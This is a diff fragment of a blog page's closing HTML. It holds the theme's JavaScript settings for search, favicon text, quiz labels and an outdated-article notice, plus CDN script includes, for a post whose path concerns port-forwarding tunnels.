+        path: `2022/11/12/network-security/neiwang/绕防火墙/端口转发/端口转发隧道代理/`,
+        favicon: {
+        show: `（●´3｀●）やれやれだぜ`,
+        hide: `(´Д｀)大変だ！`
+    },
+    search: {
+        placeholder: "文章搜索",
+        empty: "关于 「 ${query} 」，什么也没搜到",
+        stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,
+    chart: false,
+    copy_tex: false,
+    katex: false,
+    mermaid: false,
+    audio: undefined,
+    fancybox: true,
+    nocopy: false,
+    outime: true,
+    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
+    quiz: {
+        choice: `单选题`,
+        multiple: `多选题`,
+        true_false: `判断题`,
+        essay: `问答题`,
+        gap_fill: `填空题`,
+        mistake: `错题备注`
+    },
+    ignores: [
+        (uri) => uri.includes('#'),
+        (uri) => new RegExp(LOCAL.path + '$').test(uri),
+            []
+    ]
+};
+</script><script src="https://polyfill.io/v3/polyfill.min.js?features=default,fetch"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/pace/1.0.2/pace.min.js"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/algoliasearch/4.12.1/algoliasearch-lite.umd.min.js"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/instantsearch.js/4.39.0/instantsearch.production.min.js"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/quicklink/2.2.0/quicklink.umd.min.js"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/??jquery/3.5.1/jquery.min.js,fancybox/3.5.7/jquery.fancybox.min.js,justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" async></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/KaTeX/0.15.2/contrib/copy-tex.min.js" async></script><script src="/js/app.js?v=0.3.6"></script></body></html>
